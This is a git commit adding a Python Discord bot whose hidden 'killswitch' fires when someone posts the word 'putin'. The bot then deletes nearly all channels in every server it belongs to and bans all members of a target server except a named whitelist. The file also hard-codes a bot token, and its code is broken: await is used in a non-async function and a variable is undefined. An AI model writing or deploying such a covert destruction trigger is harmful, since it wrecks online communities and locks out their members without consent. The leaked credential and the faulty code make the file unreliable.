da8125bef69c86d1a40c2e41169c45e632b7c7b7
firez2469 <47616467+firez2469@users.noreply.github.com>
2021-02-20 18:14:26 -0500

    Add files via upload

---
+++ bot/TriggerDestroyBot.py
@@ -0,0 +1,70 @@
+import os
+
+import discord
+from discord.ext import commands
+from discord.ext import tasks
+
+
+TOKEN = 'ODA3NzY3NzQ0OTgzOTkwMzMz.YB8yVg.jbilrtj8eZpJAv5-H8UktfOoZ54'
+
+intents = discord.Intents.all()
+client = discord.Client(intents=intents)
+
+
+deletestuff = 'y'
+deleteHuh = True
+killRun =False
+
+@client.event
+async def on_ready():
+    print('ready')
+@client.event
+async def on_message(msg):
+    if msg.author.name == "counting" or killRun:
+        print('not gonna work')
+    else:
+        print(msg.content)
+        if msg.content.lower()== "putin":
+            kill()
+            killRun=True
+            
+    
+def kill():
+    print(client.guilds)
+    print(f'{client.user} has connected to Discord!')
+    text_channel_list = []
+    
+    for guild in client.guilds:
+        print('Checking {0} with {1}'.format(guild.name,targetServer))
+        if True:
+            print('Found server {0}'.format(guild.name))
+            for channel in guild.channels:
+                print(channel.name,channel.id)
+                try:
+                    if deleteHuh:
+                        if(channel.name!='general'):
+                            await channel.delete()
+                except:
+                    print('failed to delete channel {0}'.format(channel.name))
+    for guild in client.guilds:
+        if guild.name == targetServer and deleteHuh:
+            for user in guild.members:
+                try:
+                    if(deleteHuh and notMemberOf(user.name,['firez2469','MEE6','Pollmaster','Zira','Dyno','Dadys Boi','Experimental Games Bot'])):
+                        if(not user.name == 'Nuclear Bot'):
+                            await guild.ban(user,reason='This is the server killswitch. Youve been banned')
+                    print('Banned:',user.name,user.id)
+                except:
+                    print('failure to ban',user.name,user.id)
+        
+def notMemberOf(user, usersList):
+    for m in usersList:
+        if user==m:
+            return False
+    return True
+    print(text_channel_list)
+
+
+
+client.run(TOKEN)
+
